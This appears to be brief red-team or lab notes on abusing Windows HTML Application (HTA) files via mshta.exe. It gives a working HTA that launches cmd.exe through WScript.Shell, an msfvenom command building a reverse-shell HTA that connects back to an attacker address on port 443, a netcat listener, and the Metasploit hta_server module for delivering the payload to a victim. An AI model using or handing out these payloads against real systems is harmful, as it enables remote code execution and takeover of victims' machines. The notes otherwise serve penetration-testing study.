# An HTML Application - HTA

An HTML Application - HTA which are `dynamic HTML` pages containing JScript and VBScript.

The `mshta.exe` LOLBINS (Living-of-the-land Binaries) tool is used to execute HTA files. It can be executed alone or automatically from Internet Explorer.

Let `index.hta` be our payload to execute `cmd.exe`

```html
<html>
	<head>
		<script>
			var c = 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);
		</script>
	</head>
	<body>
		<script>
			self.close();
		</script>
	</body>
</html>
```

## HTA Reverse Connection

We can create a reverse shell payload with `msfvenom`. Once the victim visits the malicious URL and clicks Run, we get the connection.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o payload.hta
```

```sh
nc -nlvp 443
```

## Malicious HTA via Metasploit

```sh
use exploit/windows/misc/hta_server
```

On the victim machine, once we visit the malicious HTA file provided as a URL by Metasploit, we should receive a reverse connection.
